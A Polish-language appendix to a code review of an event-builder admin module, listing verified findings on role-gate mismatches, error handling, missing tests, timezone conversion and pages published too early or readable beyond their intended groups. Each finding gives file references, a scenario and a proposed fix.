# Event Builder — pełna lista ustaleń przeglądu (załącznik)

Załącznik do `docs/PRZEGLAD_MODUL_EVENT_BUILDER_2026-08-28.md`. Data: 2026-08-28, HEAD `9997ac0`.

Ustalenia pochodzą z przeglądu 15 podsystemów prowadzonego równolegle przez niezależnych recenzentów.
Każdy obszar przeszedł następnie **adwersaryjną weryfikację** — osobne przejście, którego zadaniem
było ustalenia OBALIĆ, a nie potwierdzić. Poniżej są wyłącznie te, które weryfikację przetrwały;
dziewięć obalonych jest na końcu, żeby nie wracały.

**Razem 165 ustaleń** — w wagach nadanych przez recenzentów poszczególnych podsystemów:
krytycznych 7, wysokich 45, średnich 80, niskich 33.

### Jak te wagi mają się do listy K-1…K-7 w dokumencie głównym

Te dwie siódemki **nie są tym samym zbiorem** i trzeba to powiedzieć wprost, bo inaczej triage po
samych liczbach wprowadza w błąd. Wagi tutaj nadał recenzent każdego podsystemu, patrząc wyłącznie na
swój obszar. Lista K-1…K-7 w `docs/PRZEGLAD_MODUL_EVENT_BUILDER_2026-08-28.md` to **mój triage po
ręcznej weryfikacji całości**, więc różni się w trzech miejscach:

| Różnica                                                 | Tutaj (per podsystem)                                                                   | W dokumencie głównym                                                          |
| ------------------------------------------------------- | --------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------- |
| Płatny bilet wydawany za darmo                          | **dwa wpisy** — „Bilety, pakiety" i „Powiązania"; ten sam defekt widziany z dwóch stron | jedno ustalenie **K-1**                                                       |
| Harness bazodanowy niewpięty w CI                       | krytyczny                                                                               | **U-02**, waga wysoka — nie psuje przebiegu użytkownika, tylko odbiera sygnał |
| Zdarzenia rejestracji odrzucane przez `CHECK` (**K-4**) | wysoki, w „Powiązaniach"                                                                | **krytyczny** — po ustaleniu, że `emit_domain_event` połyka wyjątek           |
| Odbiorcy pakietu niezgodni z `CHECK`-iem (**K-7**)      | wysoki, w trzech podsystemach naraz                                                     | **krytyczny** — trzy z czterech opcji UI są niezapisywalne                    |

Licząc bez duplikatu, ten załącznik ma **164 odrębne ustalenia**. Wszystkie ustalenia z listy
K-1…K-7 dokumentu głównego zostały dodatkowo sprawdzone ręcznie w kodzie — każde się potwierdziło.

Opisy i uzasadnienia weryfikatora są przycięte do czytelnej długości; pełne ścieżki i numery linii są zachowane.

---

## Szkielet studia i nawigacja

> Szkielet studia jest realny i domkniety: model nawigacji (`src/lib/events/eventStudioNav.ts`) trzyma 31 sekcji-lisci, kazda ma odpowiadajaca trase w `src/routes/admin.events_.$eventId.*` i kazda jest obecna w `src/routeTree.gen.ts` (linie 2584-2640); nie ma ani jednej sekcji bez trasy, ani jednej trasy studia bez sekcji - poza szescioma trasami przekierowujacymi (goly identyfikator, cztery indeksy grup, wycofane `content/sessions`). Rama `EventStudioShell` wczytuje wiersz raz, liczy `hiddenStudioSections` z `events.features` i podmienia tresc ukrytej sekcji na `EventStudioDisabledSection`, wiec adres ukrytej sekcji nadal odpowiada - to swiadoma decyzja, nie dziura. Stara trasa `/admin/community/events` jest juz czystym `redirect` w `beforeLoad` (kryterium odbioru E1 spelnione), podobnie siedem starych plaskich adresow `/admin/events/{agenda,meetings,onsite,registrations,sponsors,terms}`; drugiej powierzchni danych nie ma. Powazny rozjazd jest w bramkach rol: cala rama studia wpuszcza role `editor`, a `admin_event_detail` stoi za `assert_event_admin_tenant()` (admin/super_admin), […]

### [wysoki] Redaktor (rola editor) wchodzi do studia, ale RPC szczegolu jest admin-only - widzi „wydarzenie nie istnieje"

`src/components/admin/events/studio/EventStudioShell.tsx:69` · niespojnosc · weryfikacja: POTWIERDZONE

Rama studia liczy bramke jako `const canWrite = isAdmin || roles.includes("editor");` (linia 69) i przy `canWrite` odpala `useAdminEventDetail(canWrite ? eventId : "")` (linia 71). Tymczasem `admin_event_detail` stoi za `public.assert_event_admin_tenant()` (supabase/migrations/20260826150000_event_registration_settings_and_features.sql:98), a ta bramka jest jawnie opisana jako „admin albo super_admin, nigdy editor ani author" (supabase/migrations/20260825190728_...sql:87). Zapytanie konczy sie odmowa 42501, `detailQ.data` jest `undefined`, wiec `const row = detailQ.data ?? null;` (linia 98) daje `null` i rama renderuje `t("adminEvents.studio.errors.notFound")` (linie 172-183). Redaktor dostaje komunikat o nieistniejacym wydarzeniu zamiast o braku uprawnien - i to dla wydarzenia, ktore przed chwila widzial na liscie, bo `admin_events_list` stoi na szerszej bramce staffa. Nagłowek tej samej migracji (linia 14) twierdzi wprost, ze „`admin_event_detail` stoi za `assert_editor_tenant`" - […]

**Scenariusz.** Uzytkownik z rolą `editor` (bez `admin`) otwiera /admin/events/list, klika wiersz wydarzenia -> /admin/events/<id>/general. RPC `admin_event_detail` rzuca `forbidden: admin role required` (42501). Ekran pokazuje „Nie znaleziono wydarzenia", mimo ze wydarzenie istnieje i redaktor widzi je na liscie obok.

**Naprawa.** Zdecydowac, ktora bramka obowiazuje w studiu, i wyrownac obie warstwy: albo przestawic `admin_event_detail` (i siostrzane RPC studia) na `assert_event_staff_tenant()`, albo zawezic bramke ramy do `isAdmin` i pokazac redaktorowi zdanie o braku uprawnien zamiast wpuszczac go do srodka. Niezaleznie od wyboru poprawic nagłowek migracji 20260826150000 (linia 14), bo dzis wskazuje bledna bramke.

**Weryfikacja.** Probowalem obalic bramka gdzie indziej - nie ma jej. src/components/admin/events/studio/EventStudioShell.tsx:69 `const canWrite = isAdmin || roles.includes("editor")` i :71 `useAdminEventDetail(canWrite ? eventId : "")`. RPC: ostatnia definicja `admin_event_detail` to supabase/migrations/20260826150000_event_registration_settings_and_features.sql:34, a w jej DECLARE (linia 98) stoi […]

### [wysoki] Utworzenie wydarzenia przez redaktora konczy sie ekranem „nie znaleziono"

`src/routes/admin.events_.new.tsx:108` · blad · weryfikacja: POTWIERDZONE

Kreator gatuje sie na `canWrite = isAdmin || roles.includes("editor")` (linia 52), a `admin_event_create` faktycznie stoi na `public.assert_event_staff_tenant()` (supabase/migrations/20260825190728_...sql:351), czyli admin LUB editor - wiec redaktor realnie tworzy wiersz. Zaraz po sukcesie `onSuccess` robi `void navigate({ to: "/admin/events/$eventId/overview", params: { eventId } })` (linia 108), czyli wchodzi do ramy studia, ktora wola admin-only `admin_event_detail`. Efektem jest ten sam ekran „nie znaleziono" - tyle ze tym razem tuz po udanym zapisie, wiec redaktor ma podstawy sadzic, ze wydarzenie sie nie utworzylo, i probuje ponownie.

**Scenariusz.** Redaktor (`editor`, bez `admin`) wchodzi na /admin/events/new, wypelnia formularz, klika „Utworz". Toast mowi „utworzono", po czym ekran przeskakuje na /admin/events/<id>/overview i pokazuje „Nie znaleziono wydarzenia". Redaktor tworzy wydarzenie drugi i trzeci raz - powstaja duplikaty.

**Naprawa.** Wyrownac bramke tworzenia z bramka odczytu studia (albo obie na staff, albo obie na admin). Jesli studio ma zostac admin-only, kreator tez musi byc admin-only, a nie zostawiac redaktorowi mozliwosc zapisu prowadzacego na slepy zaulek.

**Weryfikacja.** src/routes/admin.events_.new.tsx:52 `canWrite = isAdmin || roles.includes("editor")`; najnowsza definicja `admin_event_create` (supabase/migrations/20260827065451_...sql:432) ma w DECLARE `v_tenant uuid := public.assert_event_staff_tenant();` (linia 438), czyli editor NAPRAWDE tworzy wiersz. Po sukcesie src/routes/admin.events_.new.tsx:108 `void navigate({ to: "/admin/events/$eventId/overview", ... })` wchodzi w […]

### [średni] Blad zapytania o wiersz wydarzenia jest raportowany jako „nie znaleziono"

`src/components/admin/events/studio/EventStudioShell.tsx:98` · blad · weryfikacja: POTWIERDZONE

`const row = detailQ.data ?? null;` (linia 98) zlepia trzy rozne stany w jeden: wydarzenie nie istnieje, odmowa uprawnien (42501) i awaria sieci / bledu RPC. `detailQ.error` nie jest nigdzie czytany, a jedyna galaz bledu to `if (row === null)` z komunikatem `adminEvents.studio.errors.notFound` (linie 172-183). Repozytorium ma juz mapowanie bledow studia na zdania (`adminEventStudioErrorMessage`, uzywane obok w linii 207 przy zmianie statusu), wiec narzedzie istnieje i nie jest tu wykorzystane.

**Scenariusz.** Chwilowa awaria sieci albo wygasla sesja Supabase przy wejsciu na /admin/events/<id>/general: zamiast komunikatu o bledzie polaczenia i mozliwosci ponowienia, administrator dostaje kategoryczne „Nie znaleziono wydarzenia" i idzie szukac, kto skasowal wydarzenie.

**Naprawa.** Rozdzielic galezie: gdy `detailQ.isError`, pokazac `adminEventStudioErrorMessage(detailQ.error)` z przyciskiem ponowienia; komunikat „nie znaleziono" zostawic wylacznie dla przypadku, w ktorym RPC odpowiedzialo poprawnie pusta lista.

**Weryfikacja.** src/components/admin/events/studio/EventStudioShell.tsx:98 `const row = detailQ.data ?? null;` - `detailQ.error` / `detailQ.isError` nie wystepuje w calym pliku (grep po `detailQ.` daje tylko `.data` w 98 i `.isPending` w 163), a jedyna galaz bledu to `if (row === null)` z `adminEvents.studio.errors.notFound` (linie 172-183). W TanStack Query v5 przy bledzie status to `error`, wiec `isPending` jest false i sciezka […]

### [średni] Brak testu ramy studia - jedynego miejsca, w ktorym stoi bramka roli i bramka modulow dla 31 sekcji

`src/components/admin/events/studio/EventStudioShell.tsx:201` · brak-testow · weryfikacja: POTWIERDZONE

Komentarz `EventStudioDisabledSection` deklaruje: „JEDNO MIEJSCE, NIE OSIEMNASCIE TRAS. Bramka stoi w ramie studia" (src/components/admin/events/studio/EventStudioDisabledSection.tsx:13-17) - i tak jest, warunek `eventFeatureHidingSection(features, activeSection)` (linia 202) rozstrzyga dostepnosc wszystkich 31 sekcji. Katalog `src/components/admin/events/studio/__tests__/` zawiera jednak wylacznie `EventStudioSection.test.tsx`. Testy pokrywaja model nawigacji (src/lib/events/**tests**/eventStudioNav.test.ts) i czysta mape funkcji (eventFeatures.test.ts), ale nie sklejenie: ze ukryta sekcja nie montuje tresci, ze `features` sa czytane z wiersza i ze bramka roli daje wlasciwy komunikat. To wlasnie ta warstwa zawiera oba rozjazdy zgloszone wyzej.

**Scenariusz.** Ktos zmienia `eventFeaturesFromJson` albo warunek w linii 238 tak, ze `children` renderuja sie mimo wylaczonego modulu. Zaden test nie pada; ekran wylaczonego modulu montuje panele i odpala RPC, ktorego wydarzenie nie uzywa - wykrywalne dopiero recznie.

**Naprawa.** Dodac test renderujacy `EventStudioShell` z zamockowanym `useAdminEventDetail`: (1) `features: {meetings:false}` + `pathname` sekcji spotkan -> renderuje sie `EventStudioDisabledSection`, a `children` NIE; (2) rola `editor` -> komunikat o uprawnieniach, nie „nie znaleziono"; (3) blad RPC -> komunikat bledu.

**Weryfikacja.** Deklaracja „JEDNO MIEJSCE, NIE OSIEMNASCIE TRAS. Bramka stoi w ramie studia" faktycznie stoi w src/components/admin/events/studio/EventStudioDisabledSection.tsx:13-17, a rozstrzygniecie w src/components/admin/events/studio/EventStudioShell.tsx:201-202 (`eventFeatureHidingSection(features, activeSection)`) i 238-242. `EVENT_STUDIO_SECTIONS` liczy 31 pozycji (src/lib/events/eventStudioNav.ts:50-82). Szukalem testu […]

### [średni] Pulpit i panel gotowosci prowadza do sekcji ukrytych przelacznikiem modulu

`src/components/admin/events/organisms/EventOverviewPanel.tsx:81` · niespojnosc · weryfikacja: POTWIERDZONE

Lista „Nastepne kroki" jest stala i nie zna `events.features`: krok `sessions` linkuje na `contentTracks` (linia 81), krok `groups` na `groups` (linia 82), a metryki licza sesje i sponsorow (linie 68,70) niezaleznie od tego, czy moduly sa wlaczone. To samo robi panel gotowosci - `publishReadiness` wskazuje sekcje `contentTracks`, `contentSpeakers`, `contentRooms`, `contentConflicts` i `registrationTickets` (src/lib/events/publishReadiness.ts:157-187), a `ReadinessItem` renderuje z nich `<Link to={EVENT_STUDIO_ROUTES[item.section]}>` (src/components/admin/events/organisms/EventReadinessPanel.tsx:128). Rama slusznie zamienia tresc ukrytej sekcji na ekran „modul wylaczony" (EventStudioShell.tsx:238-242), wiec klikniecie w krok konczy sie komunikatem o wylaczonym module zamiast na pracy.

**Scenariusz.** Webinar ma wylaczony modul „Sesje". Na pulpicie stoi niezaznaczony krok „Dodaj sesje", a w gotowosci ostrzezenie „brak sesji" ze skrotem do Sciezek. Klikniecie prowadzi na /admin/events/<id>/content/tracks, gdzie widac wylacznie zdanie „Modul Sesje jest wylaczony" i przycisk do „Funkcji dodatkowych".

**Naprawa.** Przekazac do `EventOverviewPanel` i `EventReadinessPanel` ten sam zbior `hiddenSections`, ktory rama juz liczy (EventStudioShell.tsx:107), i odfiltrowac kroki oraz pozycje raportu wskazujace na ukryte sekcje - tak samo, jak sidebar odfiltrowuje pozycje nawigacji.

**Weryfikacja.** src/components/admin/events/organisms/EventOverviewPanel.tsx:72-84 - lista `steps` jest stala, `{ key: "sessions", section: "contentTracks" }` w linii 81 i `{ key: "groups", section: "groups" }` w linii 82; metryki sesji i sponsorow licza sie w liniach 68 i 70 bez ogladania sie na `row.features`. Krok renderuje sie jako `<Link to={EVENT_STUDIO_ROUTES[step.section]}>` (linia 123). Panel gotowosci tak samo nie zna […]

### [średni] Wylaczenie modulu „Bilety" chowa wejsciowki, ale zostawia „Pakiety", ktore bez wejsciowek nie dzialaja

`src/lib/events/eventFeatures.ts:171` · niespojnosc · weryfikacja: POTWIERDZONE

Mapa `EVENT_FEATURE_TARGETS` wiaze przelacznik `tickets` z pojedyncza sekcja `registrationTickets` (linia 171). Sekcja `registrationPackages` nie jest z niczym zwiazana poza calą grupa `registration`. Tymczasem `EventPackagesPanel` buduje pakiety WYLACZNIE z typow biletow: `const ticketsQ = useEventTickets(eventId);` (src/components/admin/events/organisms/EventPackagesPanel.tsx:64) i przekazuje `tickets={ticketsQ.data ?? []}` do dialogu tworzenia (linia 342), a wiersz pakietu pokazuje nazwe biletu (linie 172-173). Po wylaczeniu „Biletow" pozycja „Pakiety" zostaje w sidebarze, a ekranu, na ktorym mozna zdefiniowac wejsciowke, nie da sie juz z nawigacji osiagnac.

**Scenariusz.** Administrator wylacza przelacznik „Bilety" dla wydarzenia z wolnym wstepem. Sidebar chowa „Wejsciowki", ale zostawia „Pakiety". Redaktor wchodzi w „Pakiety", klika „Dodaj pakiet" i dostaje pusta droplista typow biletow bez zadnej informacji, gdzie je zalozyc - bo tamten ekran zniknal z nawigacji.

**Naprawa.** Rozszerzyc cel przelacznika `tickets` na obie sekcje, np. `tickets: { kind: "sections", sections: ["registrationTickets", "registrationPackages"] }` (albo dodac drugi wpis w mapie), zeby `hiddenStudioSections` chowalo pakiety razem z wejsciowkami i zeby wejscie pod adresem pakietow trafialo na `EventStudioDisabledSection`.

**Weryfikacja.** src/lib/events/eventFeatures.ts:170-171: `registration: { kind: "group", group: "registration" }`, `tickets: { kind: "section", section: "registrationTickets" }` - `registrationPackages` nie jest celem zadnego przelacznika poza cala grupa. Szukalem drugiego celu (hiddenSectionMap, eventFeatures.ts:196-210) - nie ma. Zaleznosc pakietow od biletow jest twarda: […]

### [średni] „Blokady" panelu gotowosci nie blokuja publikacji - przycisk „Opublikuj" ich nie zna

`src/components/admin/events/studio/EventStudioTopBar.tsx:258` · niespojnosc · weryfikacja: POTWIERDZONE

`buildPublishReadiness` oznacza jako `blocker` piec warunkow: oba tytuly, poprawny zakres dat, strefa czasowa, miejsce (miasto + adres dla wydarzen stacjonarnych), okladka i zero kolizji w programie (src/lib/events/publishReadiness.ts:140-179), a panel wypisuje je jako „blokada" i pokazuje naglowek `readiness.blocked` (src/components/admin/events/organisms/EventReadinessPanel.tsx:91-95,148-150). Tymczasem `EventStudioTopBar` w ogole nie dostaje raportu - jego przycisk publikacji ma warunek `disabled={createMode || isBusy || status === "published"}` (linia 258) - a `admin_event_set_status` sprawdza wylacznie oba tytuly i `starts_at` (supabase/migrations/20260826114319_...sql:384-390). Strefa czasowa, okladka, adres i kolizje NIE sa egzekwowane nigdzie. Slowo „blokada" na ekranie jest wiec nieprawdziwe: publikacja przechodzi.

**Scenariusz.** Wydarzenie stacjonarne ma oba tytuly i date, ale nie ma okladki, strefy czasowej ani adresu, a w programie sa dwie kolizje. Pulpit pokazuje „Publikacja zablokowana - 4 blokady". Redaktor mimo to klika „Opublikuj" w pasku gornym; RPC przechodzi, `status` = `published`, strona publiczna wychodzi bez okladki i z kolidujacym programem.

**Naprawa.** Podac raport gotowosci do ramy i paska (rama i tak ma wiersz), wylaczyc przycisk publikacji gdy `report.canPublish === false` i pokazac powod; rownolegle przeniesc te warunki, ktore maja byc twarde (strefa, okladka, adres dla `onsite`), do `admin_event_set_status`, zeby bramka nie zyla wylacznie w kliencie. Alternatywa minimalna: przemianowac stopien z „blokada" na „ostrzezenie" tam, gdzie baza nic nie egzekwuje.

**Weryfikacja.** Substancja sie zgadza, choc numer linii w ustaleniu jest bledny: src/components/admin/events/studio/EventStudioTopBar.tsx ma 208 linii, a przycisk publikacji stoi w linii 196-205 z `disabled={createMode || isBusy || status === "published"}` (linia 200), nie 258. Pasek nie przyjmuje zadnego raportu gotowosci - jego propsy to status/isBusy/previewOpen/onTogglePreview/onStatusChange/section […]

### [niski] Dwa rozne ekrany startowe studia; rail kreatora obiecuje trzeci

`src/routes/admin.events_.new.tsx:108` · niespojnosc · weryfikacja: POTWIERDZONE

Wejscie z listy prowadzi na `general` (`to: "/admin/events/$eventId/general"`, src/components/admin/events/organisms/EventsListManager.tsx:584), goly identyfikator tez na `general` (src/routes/admin.events_.$eventId.index.tsx:14-17), ale kreator po zapisie idzie na `overview` (linia 108). Rail kreatora tymczasem podswietla „Informacje ogolne" jako pozycje aktywna i uzasadnia to wprost: „Po zapisie kreator prowadzi na /admin/events/<id>/general (...) przejscie z kreatora do studia nie przesunie ANI JEDNEGO PIKSELA nawigacji" (src/components/admin/events/studio/EventStudioCreateShell.tsx:18-24, 99-107). Kod i uzasadnienie sa rozjechane, a efekt na ekranie jest dokladnie taki, jakiego ten komentarz mial uniknac: podswietlenie przeskakuje z „Informacji ogolnych" na „Pulpit".

**Scenariusz.** Redaktor konczy kreator. Rail po lewej mial podswietlone „Informacje ogolne"; po zapisie ekran zmienia sie na „Pulpit", a podswietlenie skacze o jedna grupe w gore - do pozycji, ktorej w railu kreatora w ogole nie bylo.

**Naprawa.** Wybrac jeden ekran startowy po utworzeniu i zsynchronizowac go z railem: albo zmienic nawigacje w kreatorze na `/admin/events/$eventId/general`, albo podswietlic w `EventStudioCreateShell` pozycje „Pulpit" i poprawic komentarz uzasadniajacy.

**Weryfikacja.** Wejscie z listy: src/components/admin/events/organisms/EventsListManager.tsx:582-586 nawiguje na `/admin/events/$eventId/general`; goly identyfikator: src/routes/admin.events_.$eventId.index.tsx:12-18 `redirect` na `general`; kreator: src/routes/admin.events_.new.tsx:108 nawiguje na `/admin/events/$eventId/overview`. Uzasadnienie railu kreatora mowi wprost co innego - […]

---

## Informacje ogólne, branding, strony i menu

> Trzy ekrany studia stoja na jednym wzorcu: czysty modul szkicu (eventGeneralDraft.ts, eventBrandingDraft.ts) + organizm z paskiem zapisu + jedno RPC. Parytet pole UI -> argument RPC -> kolumna events jest w Informacjach ogolnych PELNY: wszystkie 21 kluczy z eventGeneralPayload (eventGeneralDraft.ts:249-277) ma galaz UPDATE w admin_event_general_save (20260826170000:302-360), a reguly (slug, ends_at > starts_at, para platforma+ID wideo, okladka wymagana przez naglowek wideo, hashtag, e-mail wsparcia, jezyki) stoja rownolegle w szkicu i w bazie. Strony wydarzenia NIE sa drugim silnikiem - event_pages to wylacznie mapowanie na public.pages, tresc zostaje w builderze, a _event_page_path i _event_page_chain_published domykaja sciezke oraz publikacje calego lancucha; ryzyko nr 1 z par. 9 jest zamkniete poprawnie. Najwieksze realne problemy leza poza parytetem formularzy: leniwy zasiew pieciu stron modulowych publikuje szesc wierszy pages dla wydarzenia w statusie draft, widocznosc per grupa pilnuje wylacznie menu (nie samej strony), daty wpisuje sie w strefie przegladarki mimo osobnego […]

### [wysoki] Daty wydarzenia wpisuje sie w strefie przegladarki, a wyswietla w events.timezone

`src/components/ui/datetime-picker.tsx:47` · niespojnosc · weryfikacja: POTWIERDZONE

AdminFormDateTimeRow oddaje wartosc jako ISO UTC, ale konwersje robi DateTimePicker lokalnym zegarem przegladarki: merged.setHours(base.getHours(), base.getMinutes(), 0, 0); onChange(merged.toISOString()) (:44-47 i :53-56). Panel Informacje ogolne montuje ten sam picker dla Begins i Ends (EventGeneralPanel.tsx:208-221), a OBOK niego stoi osobna droplista strefy wydarzenia (:222-229), ktora na zapis idzie jako zwykly tekst. Front publiczny formatuje juz konsekwentnie w strefie WYDARZENIA (src/lib/events/timezone.ts:99-122, routes/events.$slug.index.tsx:766-769). Efekt: godzina wpisana i godzina pokazana to dwie rozne godziny za kazdym razem, gdy strefa przegladarki redaktora rozni sie od events.timezone - a zaden komunikat tego nie nazywa (pole Begins nie ma nawet podpowiedzi, w jakiej strefie jest interpretowane).

**Scenariusz.** Redaktor w Warszawie (UTC+2) ustawia wydarzenie w Londynie: strefa Europe/London, Begins 09:00. Picker zapisuje 2026-09-10T07:00:00Z. Strona publiczna formatuje to w Europe/London i pokazuje uczestnikom 08:00. Blad idzie dalej do przypomnien i do bloku daty w agendzie.

**Naprawa.** Liczyc obie strony konwersji w strefie wydarzenia: przekazac draft.timezone do AdminFormDateTimeRow/DateTimePicker i zamieniac wybrana date lokalna na instant w tej strefie (oraz odwrotnie przy renderze). Minimum awaryjne: pokazac przy polach Begins/Ends etykiete strefy, w ktorej wartosc jest interpretowana, i ostrzezenie, gdy rozni sie od events.timezone.

**Weryfikacja.** Picker liczy zegarem lokalnym przegladarki: src/components/ui/datetime-picker.tsx:42-47 (merged.setHours(base.getHours(), base.getMinutes(), 0, 0); onChange(merged.toISOString())) i :49-56 dla godziny; wyswietlanie tez idzie przez format() bez strefy (:58-60). Molekula tylko przekazuje ISO (src/components/admin/molecules/AdminFormDateTimeRow.tsx:51-59) i nie oferuje zadnej podpowiedzi o strefie. Panel montuje ten […]

### [wysoki] Zasiew stron modulowych publikuje szesc stron publicznych dla wydarzenia w statusie draft

`supabase/migrations/20260826181500_event_default_module_pages.sql:377` · bezpieczenstwo · weryfikacja: POTWIERDZONE

_event_seed_default_pages wstawia korzen wydarzenia i piec stron modulowych z twardym status = 'published' (linia 340 dla korzenia, 377 dla stron modulowych), a jest wolana bezwarunkowo na koncu admin_event_create (:586) - czyli w momencie, w ktorym samo wydarzenie powstaje jako 'draft' (INSERT INTO public.events ... 'draft' - :572). Ten sam zasiew biegnie leniwie przy kazdym wejsciu na ekran Strony i menu (admin_event_pages_list, :645 PERFORM public._event_seed_default_pages(...)). Polityka RLS 'Public reads published pages' (20260625160054:33-42) wpuszcza anona do KAZDEJ strony ze statusem published w tenancie publicznym, a kolektor sitemapy bierze dokladnie ten sam zbior (src/lib/server/sitemapEntries.server.ts:64-68 - .eq('status','published') bez zadnego zwiazku z wydarzeniem). Uzasadnienie w naglowku migracji ('bo event_menu wymaga published') rozwiazuje pustke menu, ale placi za to publikacja tresci wydarzenia, ktorego redakcja jeszcze nie oglosila. Sam komentarz przyznaje, ze […]

**Scenariusz.** Redaktor klika 'Nowe wydarzenie' i wpisuje tytul 'Szczyt energetyczny NES 2027' (wydarzenie ma status draft, niewidoczne w /events). admin_event_create od razu zaklada strony: /szczyt-energetyczny-nes-2027 (korzen, tytul = tytul wydarzenia) oraz /szczyt-energetyczny-nes-2027-agenda, -prelegenci, -partnerzy, -uczestnicy, -dyskusje - wszystkie published. Anonim (i Googlebot przez /sitemaps/pages.xml) odczytuje je […]

**Naprawa.** Zwiazac status zasiewanych stron ze statusem wydarzenia: zasiewac jako 'draft', a publikacje calej szostki (korzen + piec modulow) przeniesc do admin_event_set_status przy przejsciu na 'published' (i cofac przy 'draft'/'cancelled'). Alternatywnie zostawic published tylko wtedy, gdy v_event.status = 'published' i v_event.visibility = 'public', a przy pozostalych zasiewac draft i dosiewac publikacje w momencie zmiany […]

**Weryfikacja.** Sprawdzone w kodzie: supabase/migrations/20260826181500_event_default_module_pages.sql:340 (korzen 'published') i :377 (piec stron modulowych 'published'); zasiew jest wolany bezwarunkowo z admin_event_create po INSERT ... 'draft' (:572 i :586) oraz leniwie z admin_event_pages_list (:645 PERFORM public._event_seed_default_pages). Naglowek migracji :255-266 wprost przyznaje motyw ('DLACZEGO published, A NIE draft') i […]

### [wysoki] visible_to_groups chroni wylacznie menu - sama podstrona jest publicznie czytelna pod znanym adresem

`supabase/migrations/20260826181500_event_default_module_pages.sql:927` · bezpieczenstwo · weryfikacja: POTWIERDZONE

event_menu odsiewa pozycje po grupach uczestnika (cardinality(ep.visible_to_groups) = 0 OR ep.visible_to_groups && v_groups, :925-929), a komentarz migracji 20260826120000:735-739 tlumaczy, ze filtr stoi w bazie, 'bo filtr w kliencie oznaczalby, ze pelna lista pozycji jedzie do kazdego goscia'. Ochrona konczy sie jednak na LISCIE: strona wskazywana przez pozycje jest zwyklym wierszem public.pages ze statusem published, wiec czyta ja anon polityka 'Public reads published pages' i rozwiazuje resolve_path w trasie splat (src/lib/queries/public.ts:672). Zadna z warstw publicznych nie zna event_pages.visible_to_groups - EventPageLink.tsx:55-66 kieruje pozycje niemodulowa wprost do /$ , a src/routes/$.tsx nie ma pojecia wydarzenia. Adres jest przy tym przewidywalny, bo _event_unique_page_slug sklada go z slugu wydarzenia i tytulu (20260826181500:366-368).

**Scenariusz.** Organizator zaklada podstrone 'Materialy dla partnerow' i w szufladzie pozycji zaznacza wylacznie grupe Partnerzy (EventPageEntrySheet.tsx:193-205). Pozycja znika z menu dla wszystkich poza partnerami - ale strona jest published, wiec dowolny anonim wchodzacy na /<slug-wydarzenia>/materialy-dla-partnerow (albo znajdujacy ten adres w sitemapie) widzi cala tresc.

**Naprawa.** Domknac bramke po stronie tresci, nie tylko menu: albo trzymac takie strony jako niepubliczne i serwowac je przez dedykowany RPC wydarzenia (jak strony modulowe), albo dolozyc w resolve_path/fetchGatedBody sprawdzenie event_pages.visible_to_groups dla stron nalezacych do poddrzewa wydarzenia. Do czasu naprawy UI musi mowic wprost, ze widocznosc dotyczy WYLACZNIE menu (dzis podpowiedz visibilityHint sugeruje kontrole […]

**Weryfikacja.** Filtr grup stoi wylacznie w liscie menu: supabase/migrations/20260826181500_event_default_module_pages.sql:925-929 (cardinality(ep.visible_to_groups) = 0 OR ep.visible_to_groups && v_groups) w event_menu. Nie ma zadnego drugiego miejsca, ktore uwzglednialoby visible_to_groups przy czytaniu samej strony: polityka anona dla public.pages patrzy tylko na status/deleted_at/tenant […]

### [średni] Kontrolka Uklad strony glownej (home_design) zapisuje wartosc, ktorej nic nie czyta

`src/components/admin/events/organisms/EventPagesMenuPanel.tsx:186` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

Ekran Strony i menu ma dwie karty wyboru standard/advanced (:283-318) i zapisuje wybor przez admin_event_general_save ({ id: row.id, home_design: design, pages_display_mode: mode }, :186). Kolumna istnieje i ma CHECK (20260826090000:36, :48-51), RPC ja zapisuje (20260826170000:337-339), admin_event_detail ja oddaje (20260826090000:141). Ale poza panelem i wygenerowanymi typami NIE MA w src ani jednego odczytu home_design - w odroznieniu od pages_display_mode, ktore front realnie rozstrzyga (routes/events.$slug.index.tsx:546-550). Karta advanced daje tylko odnosnik do buildera korzenia (:302-306), a standard nie robi nic - preset startowy (EB-202, docs/...ZRZUTY.md:3382) nie powstal. Redaktor dostaje wiec przelacznik ukladu, ktory nie zmienia ukladu.

**Scenariusz.** Redaktor wybiera Standard, zapisuje, widzi zielony toast pagesSaved i wraca na strone publiczna wydarzenia - wyglada dokladnie tak samo jak przy Advanced. Nie ma sposobu ustalenia z interfejsu, ze wybor jest bez skutku.

**Naprawa.** Albo dowiazac kolumne do zachowania (preset startowy dla standard, jak w EB-202, i blokada pelnej kompozycji), albo tymczasowo usunac karty z ekranu i wrocic z nimi razem z presetem - kontrolka bez skutku jest gorsza niz jej brak.

**Weryfikacja.** grep -rn 'home_design' po src/ (bez typow generowanych) daje wylacznie: src/components/admin/events/organisms/EventPagesMenuPanel.tsx:12 (komentarz), :107 (odczyt wlasnego zapisanego stanu), :186 (zapis przez admin_event_general_save) oraz plik testu i src/integrations/supabase/types.ts. Zaden komponent publiczny nie czyta tej kolumny. Kontrast z pages_display_mode jest realny - to pole front rozstrzyga […]

### [średni] Panel nie pokazuje statusu strony-korzenia, choc pobiera go i choc korzen w szkicu ubija cale publiczne menu

`src/components/admin/events/organisms/EventPagesMenuPanel.tsx:124` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

fetchEventRootPage selektuje id, slug, title_pl, title_en, status (src/lib/events/eventPagesApi.ts:181-185), ale panel bierze z odpowiedzi wylacznie slug: const rootPageSlug = rootQ.data?.slug ?? null (:124), uzywany dalej tylko do odnosnika Dostosuj (:297-306). Tymczasem event_menu wymaga published na KAZDYM przodku (_event_page_chain_published, 20260826120000:246-272; warunek w menu - 20260826181500:923-924), a admin_event_page_create zaklada korzen jako 'draft' (20260826162459:59-70). Migracja sama nazywa ten stan: 'korzen nie stoi jako pozycja menu, wiec jego szkicowy status nie ma gdzie zostac zauwazony'. Panel ma dane, zeby go zauwazyc, i ich nie uzywa - kolumna statusu stoi przy kazdej podstronie (PageMeta, :522-532), tylko nie przy korzeniu.

**Scenariusz.** Wydarzenie sprzed migracji 20260826181500 ma korzen zalozony przyciskiem Utworz strone, czyli w statusie draft. Leniwy zasiew dokłada piec stron modulowych jako published, panel pokazuje piec zielonych wierszy 'opublikowana' - a publiczne menu wydarzenia jest puste, bo lancuch przodkow nie jest opublikowany. Redaktor nie ma w studiu ani jednej informacji wskazujacej przyczyne.

**Naprawa.** Wyswietlic status korzenia na ekranie Strony i menu (wiersz nad lista albo ostrzezenie przy kartach ukladu) i przy statusie innym niz published pokazac jawne ostrzezenie 'strona glowna wydarzenia jest szkicem - menu publiczne pozostanie puste' z odnosnikiem do /admin/pages/$slug.
